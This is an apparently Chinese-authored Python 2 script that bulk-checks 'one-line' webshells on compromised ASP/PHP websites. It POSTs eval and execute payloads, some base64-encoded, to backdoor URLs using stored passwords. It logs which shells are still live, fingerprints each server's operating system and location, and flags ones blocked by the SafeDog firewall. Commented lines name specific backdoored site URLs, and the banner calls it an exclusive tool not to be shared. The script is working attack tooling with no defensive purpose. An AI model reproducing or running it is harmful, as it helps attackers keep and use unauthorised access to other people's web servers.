#!/usr/local/bin/python
#-*- coding: UTF-8 -*-

import re,httplib
import gzip,StringIO
import socket
socket.setdefaulttimeout(10)

import sys
reload(sys)
sys.setdefaultencoding('utf-8')

def yijuhua_cs(asp_php,url,PASS): #ASP还是PHP  ,URL地址 ，密码
    try:
        #选择扫描方式
        if asp_php == "":
            asp_php = "php"
        if asp_php == "asp":
            params = "=execute(\"response.clear:response.write(\"\"jinlaile\"\"):response.end\")"
        elif asp_php == "php":
            #params = "=@eval($_POST[\"echo(\"jinlaile\");die();\"]);"
            params = "=@eval(base64_decode($_POST[z0]));&z0=ZWNobygiamlubGFpbGUiKTtkaWUoKTs="
        else:
            params = "=Response.Clear();Response.Write(\"jinlaile\");"
            #构造HTTP头
        pattern = re.compile('http:*')
        match = pattern.search(url)
        if(match):
            ztarget = url.replace("http://","").split('/')[0]
            headers={"Host": ztarget,\
                     "User-Agent": "Mozilla/5.0",\
                     "Content-Type": "application/x-www-form-urlencoded",\
                     "Referer": "http://"+ztarget
            }
        else:
            #print "please enter an address....For example: [url]http://www.xxx.com/1.asp[/url]"
            return 0
            #测试  链接
        conn = httplib.HTTPConnection(ztarget)
        params = PASS+params
        try:
            conn.request(method="POST",url=url,body=params,headers=headers)
            response = conn.getresponse()
            if ('content-encoding', 'gzip') in response.getheaders():
                compressedstream = StringIO.StringIO(response.read())
                gzipper = gzip.GzipFile(fileobj=compressedstream)
                data = gzipper.read()
            else:
                data = response.read()
            if(data.find("jinlaile") >= 0):
                #print "!!!!----PASS FIND!!! -------------->"+PASS
                return 1
                #os._exit(1)
        except Exception,e:
            #print e
            return 0

    except Exception,e:
        #print e
        return 0

def yijuhua_win_linux(url,PASS): #URL地址 ，密码   返回操作系统
    try:
        #选择扫描方式
        #params = "=@eval(base64_decode($_POST[z0]));&z0=ZWNobygiamlubGFpbGUiKTtkaWUoKTs="

        params = "=echo PHP_OS;"
        #构造HTTP头
        pattern = re.compile('http:*')
        match = pattern.search(url)
        if(match):
            ztarget = url.replace("http://","").split('/')[0]
            headers={"Host": ztarget,\
                     "User-Agent": "Mozilla/5.0",\
                     "Content-Type": "application/x-www-form-urlencoded",\
                     "Referer": "http://"+ztarget
            }
        else:
            #print "please enter an address....For example: [url]http://www.xxx.com/1.asp[/url]"
            return 0
            #测试  链接
        conn = httplib.HTTPConnection(ztarget)
        params = PASS+params
        try:
            conn.request(method="POST",url=url,body=params,headers=headers)
            response = conn.getresponse()
            if ('content-encoding', 'gzip') in response.getheaders():
                compressedstream = StringIO.StringIO(response.read())
                gzipper = gzip.GzipFile(fileobj=compressedstream)
                data = gzipper.read()
            else:
                data = response.read()
            if "WINNT" in data:
                return "WINNT"
            if "Linux" in data:
                return "Linux"
            if "FreeBSD" in data:
                return "FreeBSD"
            return "null"
        except Exception,e:
            #print e
            return 0
    except Exception,e:
        #print e
        return 0


##############################################################################################
import threading
import Queue
import time
import urllib2
import urllib
import qqwry  #网址返回  IP和物理地址
import sys
url_root1 = Queue.Queue()  #网站版本漏洞  webFTP  iis写入   CMS程序识别
url_exp= Queue.Queue()  #保存扫描到的结果["127.0.0.1","admin","admin"]
yijuhuaZS=0

class C_Queue(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.OK=0
        self.NO=0

    def TXT_file(self,file_nem,data):  #写入文本
        try:
            #file_nem=time.strftime('%Y.%m.%d')   #file_nem+".txt"
            file_object = open(file_nem,'a')
            #file_object.write(list_passwed[E])
            file_object.writelines(data)
            file_object.writelines("\n")
            file_object.close()
        except Exception,e:
            print u"写入TXT失败",file_nem,data,e
            return 0

    def TXT_file2(self,file_nem,data):  #写入文本 中文
        try:
            #file_nem=time.strftime('%Y.%m.%d')   #file_nem+".txt"
            file_object = open(file_nem,'a')
            file_object.write(data.encode("utf-8")) #成功
            file_object.writelines("\n")
            file_object.close()
        except Exception,e:
            print u"写入TXT失败",file_nem,data,e
            return 0

    def url_post(self,URL):  #提交内容
        try:
            req = urllib2.Request(URL)
            req.add_header('User-Agent',"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)")
            urllib2.urlopen(req,timeout=20)  # 超时10秒   #s = urllib2.urlopen(r"http://www.163.com")
            #urllib2.urlopen(URL,timeout=20)  # 后门POST提交   超时10秒   #s = urllib2.urlopen(r"http://www.163.com")
            time.sleep(1)
            return 1
        except:
            return 0

    def open_url_data(self,url):  #读取网页内容
        try:
            return urllib.urlopen(url).read()
        except:
            return 0

    def cs(self):
        try:
            if url_root1.empty():   #判断队列是否为空
                print u"已经没有可操作的一句话了"
                time.sleep(60)
                return 0

            self.URL = url_root1.get(0.5)  #get()方法从队头删除并返回一个项目
            ASP_PHP=""
            #                url="http://www.sttc.cn/uploadfile/2013/0621/thumb_6_6_.Php.JPG%20%20%20%20%20%20%20Php"
            #                PASS="long"
            if (".asp" in self.URL[0] or ".ASP" in self.URL[0] or ".Asp" in self.URL[0]):
                ASP_PHP="asp"
            if (".php" in self.URL[0] or ".PHP" in self.URL[0] or ".Php" in self.URL[0]):
                ASP_PHP="php"

            if yijuhua_cs(ASP_PHP,self.URL[0],self.URL[1]): #ASP还是PHP  ,URL地址 ，密码
                #IPWL=h.www_data(qqwry.url_www(self.URL[0]))   #'IP/地理位置'
                #yijuhua_win_linux(url,PASS): #URL地址 ，密码   返回操作系统
                LIN_WIN32=yijuhua_win_linux(self.URL[0],self.URL[1])
                h=qqwry.C_hoset()
                WLWZ=h.www_data(qqwry.url_www(self.URL[0]))
                data=self.URL[0]+"|"+self.URL[1]+"|"+LIN_WIN32+"|"+WLWZ
                name=LIN_WIN32+"_OK.txt"
                self.TXT_file2(name,data)
                #print url
                print name,u"OK连接成功-----",data
                self.OK+=1
                time.sleep(2)
            else:
                data=self.URL[0]+"|"+self.URL[1]
                ss=self.open_url_data(self.URL[0])
                #print self.URL[0],"1111111",ss
                if ss==0:  #读取网页内容
                    data+=u"|文件丢失"
                    self.TXT_file("NO.txt",str(data))
                    print u"NO.txt文件不存在-----",data
                    self.NO+=1
                    time.sleep(1)
                else:  #www.safedog.cn
                    #if "www.safedog.cn" is ss:
                    pname = re.compile("www.safedog.cn")
                    sarr = pname.findall(ss)
                    if sarr:
                        data+=u"|被安全狗拦截"
                        self.TXT_file("AQG_NO.txt",str(data))
                        print u"NO.txt被安全狗拦截-----",data
                        self.NO+=1
                        time.sleep(1)
                    else:
                        data+=u"|密码错误"
                        self.TXT_file("NO.txt",str(data))
                        print u"NO.txt密码错误-----",data
                        self.NO+=1
                        time.sleep(1)
            print u"一句话总数%s条---成功%d条---失败%d条---还剩%d条需要测试"%(yijuhuaZS,self.OK,self.NO,yijuhuaZS-(self.OK+self.NO))
        except:
            return 0

    def run(self):
        while True:
            try:
                self.cs()
            except Exception,e:
                pass
##############################################################################################
def add_Queue():  #添加到消息队列
    try:
        list=[]
        list_2=[]
        xxx = file(TXT_file, 'r')
        for xxx_line in xxx.readlines():  #读取数据
            #如果输入的内容读取有回车符号，可以用strip来消除，可得到完美的输出
            data=xxx_line.strip()
            list.append(data)  #添加数据

        for i in list:  #去重重复数据
            if i not in list_2:
                list_2.append(i)

        for i in list_2:  #添加到数组
            ss = i.split("|")
            if len(ss)>=2:
                #print ss
                if not "http" in ss[0]:
                    print u"请带上 http://-----%s"%(ss[0])
                    continue  #跳过
                url_root1.put(ss,0.3)   #插入队列

        global yijuhuaZS
        yijuhuaZS=url_root1.qsize()
        print u"共%s条可以识别一句话数据"%(url_root1.qsize())
    except Exception,e:
        print u"添加到消息队列   错误",e
        return 0
##############################################################################################
if __name__ == "__main__":
    print u"=========  一句话批量自动检测 存活状态0.4 ========="
    print u" 目前支持ASP PHP 2种  如果是其他的话  按照PHP处理"
    print u" 检测操作系统版本  物理位置  检测一句话是否  被安全狗给吃了   "
    print u"    格式如下   http://xxxx.com/Style.php|cmd"
    print u"=========QQ群:142168763  专用工具请勿外传========="
    print u"=========      time:2014/1/14          ========="
    global TXT_file #导入文本
    TXT_file = None
    #TXT_file ="123456789.txt"

    if len(sys.argv) < 2:
        print u"无参数传入   \r\n软件使用bat方法   main.exe 1.txt   "
        print u"无参数传入   \r\n软件使用批处理或者cmd带参数传入   软件名 要扫描的内容    "
        print u"扫描内容一行一条\r\n 格式如下   http://xxxx.com/Style.php|cmd"
        time.sleep(300)
    TXT_file=sys.argv[1]

    add_Queue()  #添加到消息队列

    #    ss=["http://www.hlgfl.com/yg.php","long"]
    #    url_root1.put(ss,0.3)   #插入队列

    threads = []  #线程
    for i in range(1):  #nthreads=10  创建10个线程
        threads.append(C_Queue())
    for t in threads:   #不理解这是什么意思    是结束线程吗
        t.start()  #start就是开始线程




